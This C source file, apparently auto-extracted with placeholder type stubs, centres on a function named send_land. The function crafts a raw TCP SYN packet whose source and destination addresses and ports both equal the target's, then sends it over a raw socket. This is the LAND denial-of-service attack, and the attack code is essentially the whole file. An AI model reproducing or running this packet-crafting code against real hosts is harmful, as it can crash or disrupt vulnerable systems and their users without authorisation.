#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_7__   TYPE_3__ ;
typedef  struct TYPE_6__   TYPE_2__ ;
typedef  struct TYPE_5__   TYPE_1__ ;

/* Type definitions */
typedef  int /*<<< orphan*/  u_short ;
typedef  int /*<<< orphan*/  tcc ;
struct tcphdr {int dummy; } ;
struct TYPE_7__ {int th_off; void* th_sum; void* th_win; int /*<<< orphan*/  th_flags; void* th_seq; void* th_dport; void* th_sport; } ;
struct TYPE_5__ {int ip_hl; int ip_ttl; void* ip_sum; int /*<<< orphan*/  ip_dst; int /*<<< orphan*/  ip_src; void* ip_p; void* ip_off; int /*<<< orphan*/  ip_len; scalar_t__ ip_tos; int /*<<< orphan*/  ip_v; } ;
struct tcp_chksum_hdr {TYPE_3__ tcp; void* len; void* proto; scalar_t__ zero; int /*<<< orphan*/  dest; int /*<<< orphan*/  src; TYPE_1__ ip; } ;
struct TYPE_6__ {int sin_port; int /*<<< orphan*/  sin_addr; } ;
struct target {TYPE_2__ sa; } ;
struct sockaddr_in {int dummy; } ;
struct sockaddr {int dummy; } ;
struct raw_tcp_packet {TYPE_3__ tcp; void* len; void* proto; scalar_t__ zero; int /*<<< orphan*/  dest; int /*<<< orphan*/  src; TYPE_1__ ip; } ;
struct iphdr {int dummy; } ;
struct ip {int dummy; } ;
typedef  int /*<<< orphan*/  pkt ;

/* Variables and functions */
 void* IPPROTO_TCP ; 
 int /*<<< orphan*/  IPVERSION ; 
 int IP_DF ; 
 int /*<<< orphan*/  TH_SYN ; 
 void* chksum (int /*<<< orphan*/ *,int) ; 
 void* htons (int) ; 
 int /*<<< orphan*/  memcpy (TYPE_3__*,TYPE_3__*,int) ; 
 int /*<<< orphan*/  memset (struct tcp_chksum_hdr*,int /*<<< orphan*/ ,int) ; 
 int /*<<< orphan*/  ntohs (int) ; 
 int sendto (int,struct tcp_chksum_hdr*,int,int /*<<< orphan*/ ,struct sockaddr*,int) ; 

int send_land(int sock, struct target *host)
{
	struct raw_tcp_packet pkt;
	struct tcp_chksum_hdr tcc;

	memset(&pkt, 0, sizeof(pkt));
	memset(&tcc, 0, sizeof(tcc));

	/* ip options */
	pkt.ip.ip_v = IPVERSION;
	pkt.ip.ip_hl = sizeof(struct iphdr) / 4;
	pkt.ip.ip_tos = 0;
	pkt.ip.ip_len = ntohs(sizeof(struct ip) + sizeof(struct tcphdr));
	pkt.ip.ip_off = htons(IP_DF);
	pkt.ip.ip_ttl = 0xff;
	pkt.ip.ip_p = IPPROTO_TCP;
	pkt.ip.ip_src = pkt.ip.ip_dst = host->sa.sin_addr;
	pkt.ip.ip_sum = chksum((u_short *)&pkt.ip, sizeof(struct iphdr));

	tcc.src = tcc.dest = host->sa.sin_addr;
	tcc.zero = 0;
	tcc.proto = IPPROTO_TCP;
	tcc.len = htons(sizeof(struct tcphdr));

	tcc.tcp.th_sport = tcc.tcp.th_dport = htons(host->sa.sin_port);
	tcc.tcp.th_seq = htons(0x1d1);
	tcc.tcp.th_off = sizeof(struct ip) / 4;
	tcc.tcp.th_flags = TH_SYN;
	tcc.tcp.th_win = htons(512);

	memcpy(&pkt.tcp, &tcc.tcp, sizeof(struct tcphdr));
	pkt.tcp.th_sum = chksum((u_short *)&tcc, sizeof(tcc));
	return sendto(sock, &pkt, sizeof(pkt), 0, (struct sockaddr *)&host->sa,
				  sizeof(struct sockaddr_in));
}